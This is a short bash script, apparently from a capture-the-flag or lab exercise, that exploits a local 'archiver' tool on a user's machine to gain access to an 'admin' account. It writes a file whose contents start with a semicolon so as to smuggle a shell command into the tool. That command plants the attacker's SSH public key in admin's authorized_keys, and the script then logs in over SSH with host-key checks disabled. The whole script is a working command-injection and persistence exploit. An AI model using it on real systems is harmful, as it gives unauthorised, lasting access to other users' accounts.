#!/bin/bash

# Generate the SSH key (force overwrite)
yes | ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" -q

# Copy the contents of the public key
PUBKEY=$(cat ~/.ssh/id_rsa.pub)

# Navigate to the desired directory
cd /home/ralph/Desktop/newsletter/tools/

# Create and write to sshaccess.txt
echo ";mkdir -p /home/admin/.ssh && echo 'command=\"clear && echo Welcome to admin \:\) && /bin/bash -i\" $PUBKEY' > /home/admin/.ssh/authorized_keys && chmod 700 /home/admin/.ssh && chmod 600 /home/admin/.ssh/authorized_keys; whoami" > sshaccess.txt


./archiver -l sshaccess.txt && ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@localhost
